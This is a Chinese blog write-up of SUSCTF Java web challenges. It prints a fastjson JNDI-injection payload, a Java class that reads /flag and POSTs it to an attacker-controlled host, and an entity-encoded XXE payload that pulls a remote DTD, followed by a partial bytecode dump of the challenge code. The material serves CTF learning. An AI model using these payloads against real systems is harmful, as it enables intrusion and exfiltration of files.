@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>susctf四道Java题解 - Even - A super concise theme for Hugo</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="" /><meta name="description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.101.0 with theme even" />
+
+
+<link rel="canonical" href="http://localhost:1313/post/susctf-java-solution/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b874a8796a492f0d7c86bb24c33cbf052935783a5778ebaf819a8e514bf49f10.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="susctf四道Java题解" />
+<meta property="og:description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/post/susctf-java-solution/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-27T21:02:11+08:00" />
+<meta property="article:modified_time" content="2022-02-27T21:02:11+08:00" />
+
+<meta itemprop="name" content="susctf四道Java题解">
+<meta itemprop="description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然"><meta itemprop="datePublished" content="2022-02-27T21:02:11+08:00" />
+<meta itemprop="dateModified" content="2022-02-27T21:02:11+08:00" />
+<meta itemprop="wordCount" content="2728">
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="susctf四道Java题解"/>
+<meta name="twitter:description" content="baby gadget v1.0 登录框没有什么用，扫目录可以得到路由 /admin ，方法会跳转到 index.jsp，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 /admin ，然"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Whoami</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Whoami</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">susctf四道Java题解</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2022-02-27 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#baby-gadget-v10">baby gadget v1.0</a></li>
+        <li><a href="#baby-gadget-v10s-rrrevenge">baby gadget v1.0&rsquo;s rrrevenge</a></li>
+        <li><a href="#baby-gadget-v20">baby gadget v2.0</a></li>
+        <li><a href="#baby-gadget-v20-revenge">baby gadget v2.0 revenge</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="baby-gadget-v10">baby gadget v1.0</h2>
+<p>登录框没有什么用，扫目录可以得到路由 <code>/admin</code> ，方法会跳转到 <code>index.jsp</code>，这个跳转是由js控制的，可以把浏览器js禁用掉，直接访问 <code>/admin</code> ，然后可以下载得到依赖 <code>lib</code>：</p>
+<ul>
+<li>commons-lang.jar</li>
+<li><strong>fastjson-1.2.48.jar</strong></li>
+<li>flex-messaging-core.jar</li>
+<li>quartz.jar</li>
+</ul>
+<p>在 <code>/admin/maibox.jsp</code> 下有一个输入框，猜测是用来解析json数据的，但是怎么打DNSLOG都没有反应，接着陷入了一天在给的lib里找gadget的过程，毫无收获。</p>
+<p>第二天经过队友@Siebene的提醒，发现下面这条payload，服务器监听的nc可以收到请求数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;org.apache.xbean.propertyeditor.JndiConverter&#34;</span><span class="p">,</span><span class="nt">&#34;AsText&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://IP:PORT/Exploit&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>JNDI注入，远程可以收到ldap和http请求，但是恶意字节码中的命令无法被执行，这时候转变了一下思路，尝试向远程发起HTTP请求，把要读取的文件带到body中，恶意字节码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.OutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.HttpURLConnection</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.OutputStreamWriter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">Exploit</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">2048</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="n">FileInputStream</span> <span class="n">fis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;/flag&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fis</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">&#34;http://IP:6666/Foo&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">HttpURLConnection</span> <span class="n">connection</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">connection</span><span class="o">.</span><span class="na">setRequestMethod</span><span class="o">(</span><span class="s">&#34;POST&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">connection</span><span class="o">.</span><span class="na">setDoOutput</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">connection</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">OutputStreamWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OutputStreamWriter</span><span class="o">(</span><span class="n">connection</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">            <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">bytes</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">connection</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>服务器nc监听，拿到了flag。</p>
+<h2 id="baby-gadget-v10s-rrrevenge">baby gadget v1.0&rsquo;s rrrevenge</h2>
+<p>exp同上，修改端口直接得到flag，估计是非预期，通解了两个题。</p>
+<h2 id="baby-gadget-v20">baby gadget v2.0</h2>
+<p>开局的登陆框数据是以xml形式传输的，猜测这里有XXE，经过常规的payload测试发现之后 <code>SYSTEM</code> 被ban了，同时响应包里给了<code>hint.txt</code> ，可能要用XXE来读取根目录下的这个文件。</p>
+<p><code>SYSTEM</code> 可以用HTML实体编码绕过：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227212051124.png" alt="image-20220227212051124"></p>
+<p>payload为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a &#34;&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x38;&amp;#x32;&amp;#x2E;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#x2E;&amp;#x35;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x38;&amp;#x37;&amp;#x3A;&amp;#x38;&amp;#x30;&amp;#x30;&amp;#x30;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3E;&#34; &gt;%a;%dtd;]&gt;&lt;data&gt;&lt;env&gt;&amp;exfil;&lt;/env&gt;&lt;/data&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>去请求远程服务器的<code>.dtd</code> 文件：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227212151826.png" alt="image-20220227212151826"></p>
+<p>nc收到请求，下载 <code>58f9f32d633491243ee01cbe86f69be9.zip</code>（这里只能读取hint.txt，读取其他文件收不到请求），里面是源码的ASM「汇编」形式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JRE: 
+</span></span><span class="line"><span class="cl">8u191
+</span></span><span class="line"><span class="cl">Dependency:
+</span></span><span class="line"><span class="cl">commons-collections3.1
+</span></span><span class="line"><span class="cl">Source Code:
+</span></span><span class="line"><span class="cl">public submitUrl(Ljava/lang/String;)V throws java/io/IOException java/lang/ClassNotFoundException 
+</span></span><span class="line"><span class="cl">    // parameter  request
+</span></span><span class="line"><span class="cl">  @Lorg/springframework/web/bind/annotation/ResponseBody;()
+</span></span><span class="line"><span class="cl">  @Lorg/springframework/web/bind/annotation/PostMapping;(value={&#34;/bf2dcf6664b16e0efe471b2eac2b54b2&#34;})
+</span></span><span class="line"><span class="cl">    // annotable parameter count: 1 (visible)
+</span></span><span class="line"><span class="cl">    @Lorg/springframework/web/bind/annotation/RequestBody;() // parameter 0
+</span></span><span class="line"><span class="cl">   L0
+</span></span><span class="line"><span class="cl">    LINENUMBER 66 L0
+</span></span><span class="line"><span class="cl">    NEW sun/misc/BASE64Decoder
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL sun/misc/BASE64Decoder.&lt;init&gt; ()V
+</span></span><span class="line"><span class="cl">    ASTORE 2
+</span></span><span class="line"><span class="cl">   L1
+</span></span><span class="line"><span class="cl">    LINENUMBER 67 L1
+</span></span><span class="line"><span class="cl">    ALOAD 2
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKESTATIC java/net/URLDecoder.decode (Ljava/lang/String;)Ljava/lang/String;
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL sun/misc/BASE64Decoder.decodeBuffer (Ljava/lang/String;)[B
+</span></span><span class="line"><span class="cl">    ASTORE 3
+</span></span><span class="line"><span class="cl">   L2
+</span></span><span class="line"><span class="cl">    LINENUMBER 68 L2
+</span></span><span class="line"><span class="cl">    NEW java/io/ByteArrayInputStream
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ALOAD 3
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/io/ByteArrayInputStream.&lt;init&gt; ([B)V
+</span></span><span class="line"><span class="cl">    ASTORE 4
+</span></span><span class="line"><span class="cl">   L3
+</span></span><span class="line"><span class="cl">    LINENUMBER 69 L3
+</span></span><span class="line"><span class="cl">    NEW com/tr1ple/sus/controller/SafeInputStream
+</span></span><span class="line"><span class="cl">    DUP
+</span></span><span class="line"><span class="cl">    ALOAD 4
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL com/tr1ple/sus/controller/SafeInputStream.&lt;init&gt; (Ljava/io/InputStream;)V
+</span></span><span class="line"><span class="cl">    ASTORE 5
+</span></span><span class="line"><span class="cl">   L4
+</span></span><span class="line"><span class="cl">    LINENUMBER 70 L4
+</span></span><span class="line"><span class="cl">    ALOAD 5
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL com/tr1ple/sus/controller/SafeInputStream.readObject ()Ljava/lang/Object;
+</span></span><span class="line"><span class="cl">    POP
+</span></span><span class="line"><span class="cl">   L5
+</span></span><span class="line"><span class="cl">    LINENUMBER 71 L5
+</span></span><span class="line"><span class="cl">    ALOAD 5
+</span></span><span class="line"><span class="cl">    INVOKEVIRTUAL com/tr1ple/sus/controller/SafeInputStream.close ()V
+</span></span><span class="line"><span class="cl">   L6
+</span></span><span class="line"><span class="cl">    LINENUMBER 72 L6
+</span></span><span class="line"><span class="cl">    RETURN
+</span></span><span class="line"><span class="cl">   L7
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE this Lcom/tr1ple/sus/controller/ServerController; L0 L7 0
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE request Ljava/lang/String; L0 L7 1
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE b64 Lsun/misc/BASE64Decoder; L1 L7 2
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE requestDe [B L2 L7 3
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE inputStream Ljava/io/InputStream; L3 L7 4
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE ois Lcom/tr1ple/sus/controller/SafeInputStream; L4 L7 5
+</span></span><span class="line"><span class="cl">    MAXSTACK = 3
+</span></span><span class="line"><span class="cl">    MAXLOCALS = 6
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class com/tr1ple/sus/controller/SafeInputStream extends java/io/ObjectInputStream {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // compiled from: SafeInputStream.java
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // access flags 0x1
+</span></span><span class="line"><span class="cl">  public Z entry
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // access flags 0x1A
+</span></span><span class="line"><span class="cl">  private final static [Ljava/lang/String; blacklist
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // access flags 0x1
+</span></span><span class="line"><span class="cl">  public &lt;init&gt;(Ljava/io/InputStream;)V throws java/io/IOException 
+</span></span><span class="line"><span class="cl">    // parameter  is
+</span></span><span class="line"><span class="cl">   L0
+</span></span><span class="line"><span class="cl">    LINENUMBER 21 L0
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    ALOAD 1
+</span></span><span class="line"><span class="cl">    INVOKESPECIAL java/io/ObjectInputStream.&lt;init&gt; (Ljava/io/InputStream;)V
+</span></span><span class="line"><span class="cl">   L1
+</span></span><span class="line"><span class="cl">    LINENUMBER 11 L1
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    ICONST_1
+</span></span><span class="line"><span class="cl">    PUTFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+</span></span><span class="line"><span class="cl">   L2
+</span></span><span class="line"><span class="cl">    LINENUMBER 22 L2
+</span></span><span class="line"><span class="cl">    RETURN
+</span></span><span class="line"><span class="cl">   L3
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE this Lcom/tr1ple/sus/controller/SafeInputStream; L0 L3 0
+</span></span><span class="line"><span class="cl">    LOCALVARIABLE is Ljava/io/InputStream; L0 L3 1
+</span></span><span class="line"><span class="cl">    MAXSTACK = 2
+</span></span><span class="line"><span class="cl">    MAXLOCALS = 2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  // access flags 0x1
+</span></span><span class="line"><span class="cl">  // signature (Ljava/io/ObjectStreamClass;)Ljava/lang/Class&lt;*&gt;;
+</span></span><span class="line"><span class="cl">  // declaration: java.lang.Class&lt;?&gt; resolveClass(java.io.ObjectStreamClass)
+</span></span><span class="line"><span class="cl">  public resolveClass(Ljava/io/ObjectStreamClass;)Ljava/lang/Class; throws java/io/IOException java/lang/ClassNotFoundException 
+</span></span><span class="line"><span class="cl">    // parameter  des
+</span></span><span class="line"><span class="cl">   L0
+</span></span><span class="line"><span class="cl">    LINENUMBER 26 L0
+</span></span><span class="line"><span class="cl">    ALOAD 0
+</span></span><span class="line"><span class="cl">    GETFIELD com/tr1ple/sus/controller/SafeInputStream.entry : Z
+</span></span><span class="line"><span class="cl">    IFEQ L1
+</span></span><span class="line"><span class="cl">   L2
